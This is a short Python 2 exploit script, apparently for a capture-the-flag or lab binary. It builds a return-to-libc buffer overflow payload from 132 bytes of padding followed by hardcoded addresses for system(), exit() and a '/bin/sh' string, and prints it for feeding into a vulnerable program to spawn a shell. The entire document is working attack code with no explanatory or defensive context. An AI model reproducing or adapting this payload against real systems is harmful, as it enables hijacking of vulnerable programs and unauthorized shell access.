#!/usr/bin/python
import struct
import string

padding = "A" * 132
system = struct.pack("<I", 0xf7e2eda0)
exit = struct.pack("<I", 0xf7e229d0)
bin_sh = struct.pack("<I", 0xf7f4f82b)

s = padding + system + exit + bin_sh
print s
